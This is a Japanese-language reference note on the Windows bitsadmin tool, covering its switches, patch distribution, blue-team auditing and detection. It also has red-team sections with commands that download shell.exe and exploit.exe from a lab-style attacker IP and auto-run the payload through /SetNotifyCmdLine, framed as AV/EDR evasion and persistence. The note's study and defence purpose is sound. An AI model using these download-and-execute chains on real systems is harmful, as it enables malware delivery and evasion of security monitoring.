---
created: 2026-02-21 07:48
modified: 2026-02-21 08:29
environment: [OS/Windows]
vulnearability: [File_Download, Persistence, Defense_Evasion]
knowledge_category: Command
tags:
  - cmd
  - bitsadmin
  - file_transfer
  - lolbas
  - persistence
  - knowledge_base
---

# Command - Windows - cmd - bitsadmin - バックグラウンドでのファイル転送とジョブ管理

## 概要

`bitsadmin` は、バックグラウンド インテリジェント 転送サービス (BITS) を管理するためのコマンドラインツールです。

本来は大きなファイルのダウンロードやアップロードを、ネットワーク帯域を圧迫せずに低優先度で実行するために設計されました。中断された転送の自動再開や、ユーザーのログオフを跨いだ実行が可能な点が強力です。

(出自: `Windows 標準搭載 - 現在は非推奨とされ、PowerShellの BITS コマンドレットへの移行が推奨されている`)

## 類似コマンドと差異

| 類似コマンド | 差異 / 使い分けのポイント | 推奨 (あれば) |
| :--- | :--- | :--- |
| `certutil` | `-urlcache` スイッチでダウンロード可能。非常に高速だが、コマンド履歴からバレやすい。 | - |
| `curl` | Windows 10 (1803) 以降標準搭載。最も一般的。 | `curl` |
| `Invoke-WebRequest` (PS) | PowerShellの標準。多機能だが、スクリプト実行制限(ExecutionPolicy)に注意。 | - |
| `Start-BitsTransfer` (PS) | `bitsadmin` の現代的な代替手段。 | `Start-BitsTransfer` |

## よく連携されるコマンド

### シナリオ例: ペイロードのダウンロードと自動実行 (レッドチーム視点)

* **目的**: 外部からファイルをダウンロードし、完了後に自動的に実行させる。
* **連携コマンド**: `bitsadmin`, `cmd`
* **解説**: `/SetNotifyCmdLine` を使用すると、ジョブが完了（またはエラー）した瞬間に特定のコマンドを実行できます。
* **コマンド例**:
    ```cmd
    REM ジョブを作成し、ダウンロード完了後にバイナリを叩く
    bitsadmin /create myjob
    bitsadmin /addfile myjob [http://10.10.14.2/shell.exe](http://10.10.14.2/shell.exe) C:\Windows\Temp\shell.exe
    bitsadmin /SetNotifyCmdLine myjob C:\Windows\Temp\shell.exe NUL
    bitsadmin /resume myjob
    ```

## スイッチ/オプション説明

| スイッチ/オプション | 説明 |
| :--- | :--- |
| **基本操作** | |
| ⭐ `/transfer <name>` | 最もシンプルなダウンロード。作成から完了までを単一のコマンドで実行。 |
| `/create <name>` | 転送ジョブを新規作成する。 |
| `/addfile <name> <remote> <local>` | ジョブにファイルを追加する。 |
| `/resume <name>` | ジョブを開始または再開する（作成直後はこのコマンドが必要）。 |
| `/complete <name>` | ジョブを完了させ、一時ファイルを実ファイルに確定させる。 |
| `/cancel <name>` | ジョブを取り消し、削除する。 |
| **高度な管理** | |
| `/list [/allusers]` | 現在のジョブ一覧を表示する。`/allusers` は管理者権限が必要。 |
| `/info <name> [/verbose]` | 特定ジョブの詳細情報を表示する。 |
| `/setpriority <name> <priority>` | 優先度（FOREGROUND, HIGH, NORMAL, LOW）を設定する。 |

## よく使われる組み合わせと業務シナリオ

### 1. インフラ構築・運用視点

* **タスク**: 低帯域な支店のサーバーに対して、夜間に大きなパッチファイルを配布する。
* **組み合わせ**: `/create`, `/addfile`, `/setpriority LOW`
* **解説**: 業務時間中のネットワーク負荷を最小限に抑えつつ、バックグラウンドで着実にファイルを届けます。
* **例**:
    ```cmd
    REM 低優先度で巨大なファイルを転送
    bitsadmin /create patch_job
    bitsadmin /addfile patch_job http://fileserver/huge_patch.msi C:\updates\patch.msi
    bitsadmin /setpriority patch_job LOW
    bitsadmin /resume patch_job
    ```

### 2. ブルーチーム視点

* **タスク**: 攻撃者によって作成された、ファイルダウンロードや永続化を目的としたジョブがないか確認する。
* **組み合わせ**: `/list /allusers /verbose`
* **解説**: BITSジョブは再起動後も存続するため、隠れた永続化メカニズムとして機能します。不審なURLやファイルパスがないか精査します。
* **例**:
    ```cmd
    REM 全ユーザーのジョブを詳細に確認
    bitsadmin /list /allusers /verbose
    ```

### 3. レッドチーム視点

* **タスク**: EDRやAVの検知を避けつつ、目立たないようにファイルをドロップする（Defense Evasion）。
* **組み合わせ**: `/transfer /download /priority FOREGROUND`
* **解説**: `/transfer` スイッチは簡易的なダウンロードに適しており、OSCPのラボなどでも「とりあえずファイルを落とす」際に多用します。
* **例**:
    ```cmd
    REM 1つのコマンドでダウンロードを完結させる（フォアグラウンド実行）
    bitsadmin /transfer download_job /download /priority FOREGROUND [http://10.10.14.](http://10.10.14.)x/exploit.exe C:\Users\Public\exploit.exe
    ```

## エラーメッセージとトラブルシューティング

### よくあるエラーメッセージ

1.  **エラーメッセージ例 1**: `0x80070005 - Access is denied.`
    * **考えられる原因**: 他のユーザーが作成したジョブを操作しようとした、または管理者権限が必要なディレクトリに保存しようとした。
    * **解決策**: 管理者権限で実行するか、書き込み権限のあるディレクトリ（`C:\Users\Public`など）を指定してください。

2.  **エラーメッセージ例 2**: `The task is already defined.`
    * **考えられる原因**: 同じ名前のジョブが既に存在する。
    * **解決策**: `bitsadmin /list` で確認し、不要なら `/cancel` するか、別の名前で作成してください。

## 環境変数と設定ファイル

### 関連するレジストリ/設定ファイル

* **`C:\ProgramData\Microsoft\Network\Downloader`**: BITSのジョブデータ（QMGRファイル）が格納される場所。
* **`HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\BITS`**: BITSサービスの動作を制御するレジストリ設定。

## セキュリティに関する考慮事項

### 脆弱性と悪用事例

* **悪用シナリオ**: **Persistence (T1197)**。BITSジョブは失敗しても一定期間リトライを続けるため、URLを「攻撃者のサーバー」にしておくことで、ビーコン（通信）の代わりや、後日ペイロードを送り込むための「待ち」の状態を作ることができます。

### LOLBAS における利用例

* **機能**: `Download`, `Execute`, `ADS`
* **参照**: [LOLBAS - Bitsadmin.exe](https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/)

### 対応策・緩和策 (ブルーチーム視点)

* **Prevention (予防)**: ファイアウォール/プロキシで不審なドメインへのBITSトラフィックを遮断する。
* **Detection (検知)**: **Microsoft-Windows-BITS-Client/Operational** イベントログを監視する。特にイベントID 59（ジョブ作成）とID 60（ジョブへのファイル追加）を注視。

## 注意点・補足

* **/complete の忘れ**: `bitsadmin /create` から手動で進める場合、最後に `/complete` を実行しないと、ファイルが `.tmp` のままで残り、使用できません。 `/transfer` を使う場合は自動で完了します。

---